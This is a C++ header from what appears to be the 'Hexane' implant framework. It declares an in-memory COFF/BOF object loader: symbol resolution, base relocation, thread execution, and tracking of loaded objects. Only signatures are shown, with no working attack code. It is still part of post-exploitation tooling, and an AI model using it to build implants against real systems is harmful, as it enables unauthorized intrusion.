#ifndef HEXANE_IMPLANT_OBJECTS_HPP
#define HEXANE_IMPLANT_OBJECTS_HPP
#include <core/corelib.hpp>

namespace Objects {
    LONG
    WINAPI
    FUNCTION
        ExceptionHandler(EXCEPTION_POINTERS *exception);

    BOOL
    FUNCTION
        ExecuteFunction(EXECUTABLE *image, CONST CHAR *entry, VOID *args, SIZE_T size);

    BOOL
    FUNCTION
        ProcessSymbol(CHAR *sym_string, VOID **pointer);

    BOOL
    FUNCTION
        BaseRelocation(EXECUTABLE *image);

    VOID
    FUNCTION
        WrapperFunction(VOID *address, VOID *args, SIZE_T size);

    VOID
    FUNCTION
        AddCOFF(COFF_PARAMS *bof);

    VOID
    FUNCTION
        RemoveCOFF(UINT32 bof_id);

    COFF_PARAMS*
    FUNCTION
        GetCOFF(UINT32 bof_id);

    VOID
    FUNCTION
        COFFThread(COFF_PARAMS *params);

    VOID
    FUNCTION
        Cleanup(EXECUTABLE *image);

    VOID
    FUNCTION
        COFFLoader(CHAR *entrypoint, VOID *data, VOID *args, SIZE_T args_size);

}

#endif //HEXANE_IMPLANT_OBJECTS_HPP
